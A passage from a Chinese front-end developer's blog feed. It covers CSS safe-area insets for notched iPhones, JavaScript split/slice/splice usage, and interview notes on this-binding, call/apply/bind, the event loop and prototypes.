<p>Webkit在iOS11中新增CSS Functions: env( )替代constant( )，文档中推荐使用env( )，而 constant( ) 从Safari Techology Preview 41 和iOS11.2 Beta开始会被弃用。在不支持env( )的浏览器中，会自动忽略这一样式规则，不影响网页正常的渲染。为了达到最大兼容目的，我们可以 constant( ) 和 env( ) 同时使用。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">padding-bottom</span>: <span class="selector-tag">constant</span>(<span class="selector-tag">safe-area-inset-bottom</span>); <span class="comment">/* iOS 11.0 */</span></span><br><span class="line"><span class="selector-tag">padding-bottom</span>: <span class="selector-tag">env</span>(<span class="selector-tag">safe-area-inset-bottom</span>); <span class="comment">/* iOS 11.2 */</span></span><br></pre></td></tr></table></figure>
<h2 id="supports隔离兼容模式"><a href="#supports隔离兼容模式" class="headerlink" title="@supports隔离兼容模式"></a>@supports隔离兼容模式</h2><p>使用@supports查询机型是否支持 constant() / env()实现兼容代码隔离：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@supports</span> ((<span class="attribute">height:</span> constant(safe-area-inset-top)) <span class="keyword">or</span> (<span class="attribute">height:</span> env(safe-area-inset-top))) &#123;</span><br><span class="line">  <span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="comment">/* 适配齐刘海*/</span></span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="built_in">constant</span>(safe-area-inset-top);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 兼容 */</span></span><br><span class="line">    <span class="comment">/* padding-top: env(safe-area-inset-top); */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* padding-top: calc(40px(原来的bottom值) + constant(safe-area-inset-top)); */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 适配底部黑条*/</span></span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="built_in">constant</span>(safe-area-inset-bottom);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>但是</strong>，实际需求个别安卓也会成功进入这个判断，因此加上<code>-webkit-overflow-scrolling: touch</code>的判断可以有效规避安卓机。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@supports</span> ((<span class="attribute">height:</span> constant(safe-area-inset-top)) <span class="keyword">or</span> (<span class="attribute">height:</span> env(safe-area-inset-top))) <span class="keyword">and</span> (<span class="attribute">-webkit-overflow-scrolling:</span> touch) &#123;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="精确到机型做适配"><a href="#精确到机型做适配" class="headerlink" title="精确到机型做适配"></a>精确到机型做适配</h2><p>通过宽高、像素比来判断机型，也可以做具体适配：</p>
<p><img src="https://static.simmzl.cn/20190912174136.jpg" alt="img"></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* iphone x / xs / 11 pro*/</span></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">device-width:</span> <span class="number">375px</span>) <span class="keyword">and</span> (<span class="attribute">device-height:</span> <span class="number">812px</span>) <span class="keyword">and</span> (<span class="attribute">-webkit-device-pixel-ratio:</span> <span class="number">3</span>) &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* iphone xr / 11 */</span></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">device-width:</span> <span class="number">414px</span>) <span class="keyword">and</span> (<span class="attribute">device-height:</span> <span class="number">896px</span>) <span class="keyword">and</span> (<span class="attribute">-webkit-device-pixel-ratio:</span> <span class="number">2</span>) &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* iphone xs max / 11 pro max */</span></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">device-width:</span> <span class="number">414px</span>) <span class="keyword">and</span> (<span class="attribute">device-height:</span> <span class="number">896px</span>) <span class="keyword">and</span> (<span class="attribute">-webkit-device-pixel-ratio:</span> <span class="number">3</span>) &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然可以使用scss，写机型判断的全局变量，使用时直接使用变量</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// iphone x/xs/11 pro</span></span><br><span class="line"><span class="variable">$device-x</span>: <span class="string">"screen and (device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3)"</span>;</span><br><span class="line"><span class="comment">// iphone xr/11</span></span><br><span class="line"><span class="variable">$device-xr</span>: <span class="string">"screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2)"</span>;</span><br><span class="line"><span class="comment">// iphone x/xs/11pro max</span></span><br><span class="line"><span class="variable">$device-xmax</span>: <span class="string">"screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3)"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> #&#123;unquote(<span class="variable">$device-x</span>)&#125;,</span><br><span class="line">       #&#123;unquote(<span class="variable">$device-xr</span>)&#125;,</span><br><span class="line">       #&#123;unquote(<span class="variable">$device-xmax</span>)&#125; &#123;</span><br><span class="line">        <span class="comment">//  do something</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>等iphone12……</p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>hybrid</tag>
      </tags>
  </entry>
  <entry>
    <title>str.split与arr.splice()和arr.slice()详解</title>
    <url>/2017/08/str.split%E4%B8%8Earr.splice()%E5%92%8Carr.slice()%E8%AF%A6%E8%A7%A3.html</url>
    <content><![CDATA[<p>str.split()和arr.slice()差不多，都是根据参数分割原字符串/数组，<strong>并产生一个新的array</strong>。而splice()真是相见恨晚啊，很强大了<br><a id="more"></a></p>
<h2 id="str-split"><a href="#str-split" class="headerlink" title="str.split()"></a>str.split()</h2><p>split英文原意为分开，分裂（以一个标准将字符串分开）；</p>
<p>把一个字符串分割成<strong>字符串数组</strong>,</p>
<p> 语法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">stringObject.split(separator,howmany)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">separator   必需。**字符串或正则表达式**，从该参数指定的地方分割 stringObject。</span><br><span class="line"></span><br><span class="line">howmany 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"How are you doing today?"</span></span><br><span class="line">str.split(<span class="string">" "</span>)<span class="comment">//['How','are','you','doing','today?']</span></span><br><span class="line">str.split(<span class="string">""</span>)<span class="comment">//['H','o','w',' ','a'...'?']</span></span><br><span class="line">str.split(<span class="string">" "</span>,<span class="number">3</span>)<span class="comment">//['How','are','you']</span></span><br><span class="line">str.split(<span class="string">"a"</span>)<span class="comment">//["How ", "re you doing tod", "y ?"]</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>与str.split()相反的是arr.join(separator);</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"How are you doing today?"</span></span><br><span class="line">str.split(<span class="string">" "</span>).join(<span class="string">" "</span>)<span class="comment">//"How are you doing today?"</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="arr-slice"><a href="#arr-slice" class="headerlink" title="arr.slice()"></a>arr.slice()</h2><p>slice英文原意为划分，切下；（当成选择复制更好理解）</p>
<p>slice() 方法可从已有的数组中<strong>返回选定范围的元素</strong>，是一个<strong>新数组</strong>！</p>
<p>语法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arrayObject.slice(start,end)</span><br><span class="line"><span class="comment">//start可以是负数，end可以不加，则为直到末尾；</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">"0How"</span>, <span class="string">"1are"</span>, <span class="string">"2you"</span>, <span class="string">"3doing"</span>, <span class="string">"4today"</span>];</span><br><span class="line">arr.slice(<span class="number">1</span>,<span class="number">3</span>);<span class="comment">//["1are", "2you"]</span></span><br><span class="line">arr.slice(<span class="number">1</span>);<span class="comment">// ["1are", "2you", "3doing", "4today"]</span></span><br></pre></td></tr></table></figure>
<p>这里面有个坑，写这篇博客用console调试时才发现：</p>
<hr>
<p><strong>slice(1,3)选取的是1和2，并不包含end所指的那个元素！</strong></p>
<hr>
<h2 id="arr-splice"><a href="#arr-splice" class="headerlink" title="arr.splice()"></a>arr.splice()</h2><p>splice英文原意为粘结处（从粘结处开始添加或者删除</p>
<p>重点来了！</p>
<p>splice() 方法是<strong>向/从</strong>数组中<strong>添加/删除</strong>项目，<strong>然后返回被添加/删除的项目</strong>。说白了，<strong>就是可以往数组添加和删除元素。</strong></p>
<p>注释：该方法<strong>会改变原始数组</strong>。</p>
<p>语法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arrayObject.splice(index,howmany,item1,.....,itemX)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">index   必需。整数，规定添加/删除项目的位置，可使用负数；</span><br><span class="line">howmany 必需。要删除的项目数量。**如果设置为 <span class="number">0</span>，则不会删除项目。</span><br><span class="line">item1, ..., itemX   可选。**向数组添加的新项目。**</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"><span class="comment">//往数组4的位置插入一个“test”:</span></span><br><span class="line">arr.splice(<span class="number">3</span>,<span class="number">0</span>,<span class="string">"test"</span>);<span class="comment">//[]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//[0,1,2,3,"test",4,5,6,7]</span></span><br><span class="line"><span class="comment">//删除数组中3-5，替换为"h","a","h","a":</span></span><br><span class="line">arr.splice(<span class="number">3</span>,<span class="number">5</span>,<span class="string">"h"</span>,<span class="string">"a"</span>,<span class="string">"h"</span>,<span class="string">"a"</span>);<span class="comment">//[3,4,5]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//[0, 1, 2, "h", "a", "h", "a", 6, 7]</span></span><br></pre></td></tr></table></figure>
<p>这里面又有个坑….写这篇博客用console调试时才发现….：</p>
<hr>
<p><strong>arr.splice(3,5,”h”,”a”,”h”,”a”)返回的是被删除的元素组成的数组！！！不是arr,之前以为直接返回arr</strong></p>
<hr>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>易乱</tag>
      </tags>
  </entry>
  <entry>
    <title>Some tips for FE</title>
    <url>/2019/07/some%20tips%20for%20fe.html</url>
    <content><![CDATA[<p>一些面试的总结。</p>
<a id="more"></a>
<h1 id="js"><a href="#js" class="headerlink" title="js"></a>js</h1><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><p>传统：谁调用指向谁<br>箭头函数：默认指向在定义它时,它所处的对象,而不是执行时的对象</p>
<p><a href="https://juejin.im/post/5c049e6de51d45471745eb98" target="_blank" rel="noopener">https://juejin.im/post/5c049e6de51d45471745eb98</a></p>
<p>this的四个调用模式（js语言精粹）：</p>
<ul>
<li>方法调用模式（一个函数作为一个对象的属性，这个函数内的this指向这个对象）</li>
<li>函数调用模式 （一个函数不是对象的属性，直接定义在全局，这个函数内的this指向全局，浏览器下的window、global）</li>
<li>构造器调用模式 （通过构造器去new 一个实例，构造函数的this会绑定到这个实例）</li>
<li>apply调用模式 （通过可以apply、call、bind可以改变this的指向）</li>
</ul>
<!-- more -->
<h2 id="call-bind-apply实现原理及区别"><a href="#call-bind-apply实现原理及区别" class="headerlink" title="call, bind, apply实现原理及区别"></a>call, bind, apply实现原理及区别</h2><ul>
<li><p>apply、call、bind 三者都是函数的一个方法，第一个参数都是 this 要指向的对象，也就是想指定的上下文；</p>
</li>
<li><p>apply、call、bind 三者都可以利用后续参数传参，其中只有<strong>apply()后续参数以数组</strong>形式传；</p>
</li>
<li><p>bind 是返回对应的绑定函数，便于稍后调用；apply、call 则是立即调用。</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> parent = &#123;</span><br><span class="line">    age: <span class="number">30</span>,</span><br><span class="line">    <span class="comment">// 注意在用apply等时，这里不能用箭头函数，箭头定义时this已经指定，无法被apply等改变</span></span><br><span class="line">    run: <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123; <span class="built_in">console</span>.log(<span class="keyword">this</span>.age, name) &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> child = &#123;</span><br><span class="line">    age: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">parent.run.apply(child, [<span class="string">"tom"</span>]); <span class="comment">// 1 tom // 立即执行</span></span><br><span class="line">parent.run.call(child, <span class="string">"tom"</span>); <span class="comment">// 1 tom // 立即执行</span></span><br><span class="line">parent.run.apply(<span class="literal">null</span>); <span class="comment">// undefined undefined // null 是window下的，表示this指向window</span></span><br><span class="line">parent.run.apply(<span class="literal">undefined</span>); <span class="comment">// undefined undefined // undefined 指向window</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fn = parent.run.bind(child, <span class="string">"tom"</span>); <span class="comment">// bind会返回一个函数</span></span><br><span class="line">fn(); <span class="comment">// 1 tom</span></span><br></pre></td></tr></table></figure>
<h3 id="call-amp-apply实现原理"><a href="#call-amp-apply实现原理" class="headerlink" title="call &amp; apply实现原理"></a>call &amp; apply实现原理</h3><p>可以看看这个<a href="https://segmentfault.com/a/1190000009257663" target="_blank" rel="noopener">JavaScript深入之call和apply的模拟实现</a></p>
<p>fn.apply(obj, array)实现的原理：</p>
<ul>
<li>将要执行的函数fn设置为该对象obj的属性</li>
<li>执行obj.fn(args)函数</li>
<li>不能给这个obj对象新增新的属性，所以要删除这个属性；</li>
<li>其中对obj要做判断，为<strong>null或undefined</strong>时，要把this指向window</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.call = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先判断是不是函数调用该方法，如果不是，则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为**null或undefined**时，要把this指向window</span></span><br><span class="line">    <span class="keyword">var</span> context = context || <span class="built_in">window</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将函数设置为obj的属性</span></span><br><span class="line">    context.fn = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类数组解构参数</span></span><br><span class="line">    <span class="keyword">var</span> args = [...arguments].slice(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行函数</span></span><br><span class="line">    <span class="keyword">var</span> result = context.fn(...args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除函数</span></span><br><span class="line">    <span class="keyword">delete</span> context.fn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回执行结果</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// apply与call不同只在于参数处理不用</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.apply = <span class="function"><span class="keyword">function</span> (<span class="params">context, args</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先判断是不是函数调用该方法，如果不是，则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为**null或undefined**时，要把this指向window</span></span><br><span class="line">    <span class="keyword">var</span> context = context || <span class="built_in">window</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将函数设置为obj的属性</span></span><br><span class="line">    context.fn = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行函数</span></span><br><span class="line">    <span class="keyword">var</span> result;</span><br><span class="line">    <span class="keyword">if</span> (args) &#123;</span><br><span class="line">        result = context.fn(...args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = context.fn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除函数</span></span><br><span class="line">    <span class="keyword">delete</span> context.fn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回执行结果</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="bind实现原理"><a href="#bind实现原理" class="headerlink" title="bind实现原理"></a>bind实现原理</h3><p>bind其实是在call、apply基础上封装了一层，因此多次调用bind，只会第一次生效；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">parent.run.bind(child, <span class="string">"tom"</span>).bind(child1, <span class="string">"jack"</span>).bind(child2, <span class="string">"Rachael"</span>)();</span><br><span class="line"><span class="comment">// 1 tom </span></span><br><span class="line"><span class="comment">// 并不会继续下去</span></span><br></pre></td></tr></table></figure>
<p><strong>简单的实现：</strong><br>实际要复杂一些<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先判断是不是函数调用该方法，如果不是，则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> me = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 去掉第一个函数参数</span></span><br><span class="line">    <span class="keyword">var</span> args = [...arguments].slice(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// var args = Array.prototype.slice(arguments, 1);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 把后面的执行函数的参数拼接到bing参数后</span></span><br><span class="line">        <span class="keyword">return</span> me.apply(context, args.concat(...arguments);</span><br><span class="line">        <span class="comment">// return me.apply(context, args.concat(Array.prototype.slice(arguments));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="event-loop"><a href="#event-loop" class="headerlink" title="event loop"></a>event loop</h2><p>macrotask &amp; microtask</p>
<p>js如何处理异步函数？</p>
<p>Event Loop即事件循环，是指浏览器或Node的一种解决javaScript<strong>单线程</strong>运行时不会阻塞的一种机制，也就是我们经常使用异步的原理。</p>
<h3 id="执行栈"><a href="#执行栈" class="headerlink" title="执行栈"></a>执行栈</h3><p>堆heap：程序运行时的动态内存；<strong>js中堆存放object数据</strong><br>栈stack：一个数据集合，比如一堆牌（垂直堆叠），先进后出；js中栈存放<strong>基础数据类型</strong>和<strong>函数执行的运行空间</strong>；<strong>同步任务在此处</strong><br>队列：一个数据集合，像是一个流水线，先进先出。<br>链表：一个数据集合，每个元素都是一个对象节点，包含了数据和下一个节点的指针，每个节点相连，就成了链表。</p>
<p>event loop使得js会先执行栈内存中的同步任务，只有当同步任务执行完毕后，才去执行任务对列中的异步任务；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>);    </span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// 1 3 2</span></span><br></pre></td></tr></table></figure>
<h3 id="微任务与宏任务"><a href="#微任务与宏任务" class="headerlink" title="微任务与宏任务"></a>微任务与宏任务</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 3 2</span></span><br></pre></td></tr></table></figure>
<p>这是因为 异步任务 分为 微任务(microtask) 和 宏任务(macrotask)，执行的顺序是 执行<strong>栈中的同步代码 =&gt; 微任务 =&gt; 宏任务</strong>。</p>
<h4 id="微任务"><a href="#微任务" class="headerlink" title="微任务"></a>微任务</h4><p><strong>promise是微任务。</strong></p>
<p>当执行栈中的代码执行完后，会先执行微任务对列，只有当微任务对列中所有任务执行完了，才会执行宏任务。</p>
<h4 id="宏任务"><a href="#宏任务" class="headerlink" title="宏任务"></a>宏任务</h4><p><strong>setTimeout setInterval setImmediate(IE专用)等</strong></p>
<p>等执行栈和微任务都执行完了，才来执行宏任务对列，且每个宏任务执行完了都要看一下微任务对列有没有新增任务，有就执行微任务，清空微任务对列后才开始回来执行宏任务。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'timeout1'</span>)</span><br><span class="line">    <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'promise1'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'promise2'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'timeout2'</span>)</span><br><span class="line">    <span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'promise3'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>
<p>解析： </p>
<p>1、先将两个setTimeout压入异步对列中的宏任务对列；<br>2、宏任务对列中时间到了先执行第一个setTimeout，打印timeout1。之后发现两个promise，压入微任务。<br>3、第一个setTimeout执行完毕，去看微任务对列，发现有两个微任务。先进先出，执行第一个promise：打印p1，之后p2;<br>4、微任务清空后，执行宏任务，打印t2，发现一个微任务并压入微任务对列中；<br>5、第二个setTimeout执行完毕，去看微任务对列，发现有一个微任务。执行，打印p3；</p>
<p>所以最后输出： t1 p1 p2 t2 p3</p>
<h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><h2 id="捕获和冒泡"><a href="#捕获和冒泡" class="headerlink" title="捕获和冒泡"></a>捕获和冒泡</h2><p>捕获是false</p>
<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>接受和或返回另一个函数称为高阶函数</p>
<h2 id="闭包、原型链、垃圾回收机制、JS如何实现继承"><a href="#闭包、原型链、垃圾回收机制、JS如何实现继承" class="headerlink" title="闭包、原型链、垃圾回收机制、JS如何实现继承"></a>闭包、原型链、垃圾回收机制、JS如何实现继承</h2><p><a href="https://blog.simmzl.cn/2017/09/%E8%AE%A9%E4%BA%BA%E5%A4%B4%E5%A4%A7%E7%9A%84%E9%97%AD%E5%8C%85%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6GC.html">关于闭包</a></p>
<p><strong>实例的<strong>proto</strong>属性（原型）等于其构造函数的prototype属性</strong></p>
<p>实例p的构造函数为Person，而Person的构造函数为Function</p>
<p>手动实现继承：Child.prototype = new Parent();</p>
<p>prototype是函数的一个属性（每个函数都有一个prototype属性），这个属性是一个指针，指向一个对象。它是显示修改对象的原型的属性。</p>
<p>1、Object是作为众多new出来的实例的基类   function Object(){ [ native code ] }<br>2、Function是作为众多function出来的函数的基类    function Function(){ [ native code ] }<br>3、构造函数的proto(包括Function.prototype和Object.prototype)都指向Function.prototype<br>4、原型对象的proto都指向Object.prototype<br>5、Object.prototype.proto指向null</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = &#123;&#125;,</span><br><span class="line">    F = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.prototype.a = <span class="string">'value a'</span>;</span><br><span class="line"><span class="built_in">Function</span>.prototype.b = <span class="string">'value b'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo.a) <span class="comment">// a</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.b) <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(F.a) <span class="comment">// a</span></span><br><span class="line"><span class="built_in">console</span>.log(F.b) <span class="comment">// b</span></span><br></pre></td></tr></table></figure>
<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="新特性"><a href="#新特性" class="headerlink" title="新特性"></a>新特性</h3><p>let const =&gt; class 对象解构赋值 async/await 函数的默认参数值 for…of Promise</p>
<p><a href="https://blog.simmzl.cn/2017/11/Promise%E5%AF%B9%E8%B1%A1-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html">Promise对象-异步编程解决方案</a></p>
<p><a href="https://blog.simmzl.cn/2018/03/%E5%90%83%E4%BA%86%E8%BF%99%E5%8F%A3ES67%E8%AF%AD%E6%B3%95%E7%B3%96.html">吃了这口ES6/7语法糖</a></p>
<h3 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h3><h3 id="箭头函数和普通函数的区别，有什么新特性"><a href="#箭头函数和普通函数的区别，有什么新特性" class="headerlink" title="箭头函数和普通函数的区别，有什么新特性"></a>箭头函数和普通函数的区别，有什么新特性</h3><p>1、简写<br>2、es5的函数中this的指向（上下文）取决于谁调用他，而箭头函数的中this的指向在声明时就已经固定；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">	aa: <span class="number">1</span>,</span><br><span class="line">	bb: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">cc</span> (<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="keyword">this</span>) &#125;;</span><br><span class="line">		cc();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">a.bb(); <span class="comment">// Window</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">	aa: <span class="number">1</span>,</span><br><span class="line">	bb: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">const</span> cc = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">		cc();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">a.bb(); <span class="comment">// a</span></span><br></pre></td></tr></table></figure>
<p><a href="http://es6.ruanyifeng.com/#docs/generator" target="_blank" rel="noopener">http://es6.ruanyifeng.com/#docs/generator</a></p>
<h2 id="for…in迭代和for…of有什么区别，-forEach"><a href="#for…in迭代和for…of有什么区别，-forEach" class="headerlink" title="for…in迭代和for…of有什么区别， forEach"></a>for…in迭代和for…of有什么区别， forEach</h2><p><a href="https://www.jianshu.com/p/c43f418d6bf0" target="_blank" rel="noopener">https://www.jianshu.com/p/c43f418d6bf0</a></p>
<h3 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h3><ul>
<li>用于对象或数组</li>
<li><strong>遍历自有的、继承的、可枚举的、非Symbol的属性</strong>，包括原型上的，所以需要配合<code>Object.prototype.hasOwnProperty(propname)</code></li>
